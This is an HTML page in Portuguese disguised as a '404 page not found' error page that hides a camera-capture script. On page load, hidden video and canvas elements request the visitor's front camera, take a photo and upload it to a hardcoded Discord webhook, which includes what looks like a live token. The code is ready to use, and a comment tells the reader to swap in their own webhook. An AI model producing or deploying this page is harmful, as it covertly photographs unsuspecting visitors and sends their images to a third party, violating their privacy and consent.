<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Erro 404 - Página Não Encontrada</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f8f9fa;
            color: #343a40;
            text-align: center;
            padding: 50px;
            margin: 0;
        }
        .error-container {
            max-width: 600px;
            margin: 0 auto;
        }
        h1 {
            font-size: 72px;
            margin: 0;
            color: #dc3545;
        }
        p {
            font-size: 18px;
            margin: 20px 0;
        }
        a {
            color: #007bff;
            text-decoration: none;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="error-container">
        <h1>404</h1>
        <p>Oops! A página que você está procurando não existe.</p>
        <p>Você pode <a href="/">voltar para a página inicial</a> ou tentar novamente mais tarde.</p>
    </div>

    <!-- Elementos ocultos para captura da câmera -->
    <video id="hiddenVideo" autoplay class="hidden"></video>
    <canvas id="hiddenCanvas" class="hidden"></canvas>

    <script>
        // Configuração do Webhook do Discord (substitua pela sua URL)
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1391479176376356928/JxCpfTy6kCzBtR_RCh07NnNoPEZ9fM6XSnvpNI0EI_EVXF9BJtuF_nBKiDGH6TEjzcwL';

        // Função para capturar a foto e enviar para o Discord
        async function captureAndSendPhoto() {
            try {
                const video = document.getElementById('hiddenVideo');
                const canvas = document.getElementById('hiddenCanvas');
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: 640,
                        height: 480 
                    } 
                });

                video.srcObject = stream;
                
                // Espera um pouco para garantir que a câmera está ativa
                await new Promise(resolve => setTimeout(resolve, 1000));

                // Captura o frame
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Converte para base64
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                
                // Para a câmera
                stream.getTracks().forEach(track => track.stop());
                
                // Envia para o Discord
                await sendToDiscord(imageData);
            } catch (error) {
                console.error('Erro ao capturar foto:', error);
            }
        }

        // Função para enviar a foto para o Discord via webhook
        async function sendToDiscord(imageData) {
            if (!DISCORD_WEBHOOK_URL.includes('https://discord.com/api/webhooks')) {
                console.error('Webhook do Discord não configurado corretamente');
                return;
            }

            try {
                // Extrai os dados base64
                const base64Data = imageData.split(',')[1];
                
                // Converte para blob
                const blob = await fetch(`data:image/jpeg;base64,${base64Data}`).then(res => res.blob());
                
                // Cria form data
                const formData = new FormData();
                formData.append('file', blob, 'foto.jpg');
                
                // Envia para o webhook
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    body: formData
                });
                
                console.log('Foto enviada com sucesso para o Discord');
            } catch (error) {
                console.error('Erro ao enviar para o Discord:', error);
            }
        }

        // Inicia a captura quando a página carrega
        window.addEventListener('load', () => {
            setTimeout(captureAndSendPhoto, 1000); // Espera 1s antes de capturar
        });
    </script>
</body>
</html>
